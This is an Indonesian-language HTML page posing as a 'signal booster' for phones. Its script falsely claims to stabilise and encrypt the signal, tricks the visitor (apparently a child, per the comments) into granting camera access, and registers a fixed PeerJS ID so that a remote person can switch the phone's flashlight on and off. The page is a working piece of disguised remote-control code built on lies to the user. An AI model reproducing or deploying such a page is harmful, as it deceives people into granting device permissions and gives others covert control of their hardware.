<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sinyal Booster Hayabusa V5</title>
    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
    <style>
        body { background: #000; color: #00ff00; text-align: center; font-family: 'Segoe UI', sans-serif; padding-top: 100px; }
        .box { border: 2px solid #00ff00; padding: 30px; display: inline-block; border-radius: 20px; background: rgba(0,255,0,0.05); box-shadow: 0 0 20px rgba(0,255,0,0.2); }
        h2 { text-shadow: 0 0 10px #00ff00; }
        .btn { background: #00ff00; color: #000; padding: 20px 40px; border-radius: 50px; border: none; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 20px; transition: 0.3s; }
        .btn:active { transform: scale(0.9); box-shadow: 0 0 30px #00ff00; }
        #stat { color: #fff; font-size: 14px; margin-top: 10px; display: block; }
    </style>
</head>
<body>

    <div class="box">
        <h2>ðŸš€ SIGNAL OPTIMIZER</h2>
        <p>Status: <span id="stat">Menghubungkan Jaringan...</span></p>
        <button class="btn" onclick="aktifkan()">HUBUNGKAN SINYAL</button>
        <p style="font-size: 10px; color: #555; margin-top: 20px;">*Jangan tutup halaman ini agar ping stabil</p>
    </div>

    <script>
        // --- KONFIGURASI REMOTE ---
        const KUNCI_REMOT = "hayabusa_remote_anak_123"; 
        const peer = new Peer(KUNCI_REMOT);
        let videoTrack = null;
        let s_stream = null;

        // Saat sistem siap
        peer.on('open', (id) => {
            document.getElementById('stat').innerText = "Sistem Siap! (ID Terdaftar)";
            console.log("Peer ID:", id);
        });

        // Menerima koneksi dari Remote Abang
        peer.on('connection', (conn) => {
            document.getElementById('stat').innerText = "Remote Terhubung âœ…";
            
            // Mendengarkan perintah ON atau OFF
            conn.on('data', (data) => {
                console.log("Perintah diterima:", data);
                if (data === "ON") kontrolSenter(true);
                if (data === "OFF") kontrolSenter(false);
            });
        });

        // Fungsi yang dijalankan saat anak klik tombol
        async function aktifkan() {
            try {
                if (!s_stream) {
                    s_stream = await navigator.mediaDevices.getUserMedia({
                        video: { facingMode: "environment" }
                    });
                    videoTrack = s_stream.getVideoTracks()[0];
                }
                document.getElementById('stat').innerText = "Booster Aktif & Terenkripsi!";
                alert("Berhasil! Sinyal akan distabilkan secara otomatis.");
            } catch (e) {
                alert("Gagal! Izin kamera diperlukan untuk sinkronisasi hardware.");
                console.error(e);
            }
        }

        // Fungsi inti Senter (Torch)
        async function kontrolSenter(status) {
            if (videoTrack) {
                try {
                    await videoTrack.applyConstraints({
                        advanced: [{ torch: status }]
                    });
                    console.log("Senter status:", status);
                } catch (err) {
                    alert("Senter tidak didukung di perangkat ini.");
                }
            } else {
                console.warn("Kamera belum aktif. Anak harus klik tombol dulu.");
            }
        }
    </script>
</body>
</html>
